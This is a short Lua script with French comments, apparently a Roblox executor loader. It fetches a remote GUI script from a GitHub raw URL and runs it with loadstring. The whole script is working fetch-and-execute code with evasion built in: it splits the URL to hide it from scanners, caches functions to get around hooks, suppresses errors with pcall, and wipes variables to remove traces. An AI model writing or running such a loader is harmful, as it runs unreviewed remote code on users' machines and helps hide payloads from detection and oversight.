-- 1. Mise en cache des vraies fonctions (empêche les fausses requêtes et les Hooks)
local l_game = game
local l_httpGet = l_game.HttpGet
local l_loadstring = loadstring

-- 2. Découpage du lien (empêche les bots et les scanners de récupérer l'URL en clair)
local url_parts = {
    "https://raw.githubusercontent.com/soronicepgf-rgb/",
    "S-curit-astrale/refs/heads/main/ytopkhijhirtjhiortnzuohnrt/",
    "rtjhgtiuhgrtiurthtrh/ruehtgiurtguirtuighrtz/",
    "ghrnzgirnzgirnzgihrzighr/gtzugzhgybhzzrgyerz/",
    "trhrtehioj%2Creojihneto/plm.GUI.lua"
}
local secure_url = table.concat(url_parts, "")

-- 3. Exécution protégée dans un pcall (bloque les retours d'erreurs exploitables)
pcall(function()
    l_loadstring(l_httpGet(l_game, secure_url))()
end)

-- 4. Nettoyage des variables (efface les traces en mémoire)
url_parts = nil
secure_url = nil
